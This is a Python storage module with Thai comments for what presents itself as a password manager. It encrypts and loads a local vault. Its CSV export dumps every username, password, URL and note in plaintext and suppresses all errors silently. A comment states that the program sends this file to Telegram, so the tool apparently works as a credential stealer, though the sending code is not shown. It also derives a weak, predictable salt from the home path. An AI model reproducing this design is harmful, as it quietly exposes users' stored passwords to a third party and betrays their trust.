import json
import hashlib
from pathlib import Path
from utils.crypto import CryptoManager
import csv
import win32crypt

try:
    import win32crypt  # pip install pywin32
    _HAS_DPAPI = True
except Exception:
    _HAS_DPAPI = False

class DataStorage:
    """จัดการการเก็บและโหลดข้อมูล"""
    
    def __init__(self, filename="secure_data.enc"):
        self.filename = Path.home() / ".password_manager" / filename
        self.filename.parent.mkdir(exist_ok=True)
        self.salt = self._get_or_create_salt()

    def export_data_to_csv(self, data: dict, csv_path: Path):
        """
        เขียนข้อมูลเป็น CSV แบบ UTF-8 with BOM (หลัก) และสำเนา Windows-874 (สำหรับ Excel ไทย)
        Columns: folder, title, username, password, url, notes
        """
        try:
            csv_path = Path(csv_path)
            csv_path.parent.mkdir(parents=True, exist_ok=True)

            rows = []
            rows.append(['folder', 'title', 'username', 'password', 'url', 'notes'])
            folders = data.get('folders', {}) or {}
            for folder_name, entries in folders.items():
                for entry in entries:
                    rows.append([
                        folder_name,
                        entry.get('title', ''),
                        entry.get('username', ''),
                        entry.get('password', ''),
                        entry.get('url', ''),
                        entry.get('notes', '')
                    ])

            # เขียนไฟล์หลักเป็น UTF-8 with BOM (utf-8-sig)
            with open(csv_path, 'w', encoding='utf-8-sig', newline='') as f:
                writer = csv.writer(f)
                writer.writerows(rows)

            # เขียนสำเนาสำหรับ Excel ไทย (cp874) — ตัวโปรแกรมจะส่งไฟล์หลักไป Telegram แต่ไฟล์ _win874 มีไว้ทดสอบ/ดาวน์โหลด
            try:
                win_path = csv_path.with_name(csv_path.stem + "_win874" + csv_path.suffix)
                with open(win_path, 'w', encoding='cp874', newline='') as f2:
                    writer2 = csv.writer(f2)
                    writer2.writerows(rows)
            except Exception:
                # ถ้า cp874 ไม่มี/ล้มเหลว ให้เงียบ (ยังมีไฟล์ utf-8-sig อยู่)
                pass

        except Exception:
            # เงียบตามข้อกำหนดของโปรเจ็กต์
            pass
    
    def save_metadata(self, meta: dict):
        """บันทึก metadata (ไม่เข้ารหัส) ไฟล์เดียวกับ storage แต่ต่างนามสกุล"""
        try:
            meta_file = self.filename.with_suffix('.meta.json')
            meta_file.parent.mkdir(parents=True, exist_ok=True)
            with open(meta_file, 'w', encoding='utf-8') as f:
                json.dump(meta, f, ensure_ascii=False, indent=2)
        except Exception:
            # ไม่ล้มเหลวร้ายแรง — ไม่จำเป็นต้องแจ้งผู้ใช้ที่นี่
            pass

    def load_metadata(self):
        """โหลด metadata (ไม่เข้ารหัส) ถ้ามี"""
        try:
            meta_file = self.filename.with_suffix('.meta.json')
            if not meta_file.exists():
                return {}
            with open(meta_file, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception:
            return {}
        
    def _get_or_create_salt(self) -> bytes:
        """สร้างหรือโหลด salt"""
        salt_file = self.filename.parent / ".salt"
        if salt_file.exists():
            return salt_file.read_bytes()
        else:
            salt = hashlib.sha256(str(Path.home()).encode()).digest()
            salt_file.write_bytes(salt)
            return salt
    
    def save_data(self, data: dict, master_password: str):
        """บันทึกข้อมูลแบบเข้ารหัส"""
        json_data = json.dumps(data, ensure_ascii=False)
        encrypted = CryptoManager.encrypt_data(json_data, master_password, self.salt)
        self.filename.write_text(encrypted)
    
    def load_data(self, master_password: str) -> dict:
        """โหลดข้อมูลและถอดรหัส"""
        if not self.filename.exists():
            return None
        
        try:
            encrypted = self.filename.read_text()
            decrypted = CryptoManager.decrypt_data(encrypted, master_password, self.salt)
            return json.loads(decrypted)
        except:
            return None
    
    def delete_all_data(self):
        """ลบข้อมูลทั้งหมด"""
        if self.filename.exists():
            self.filename.unlink()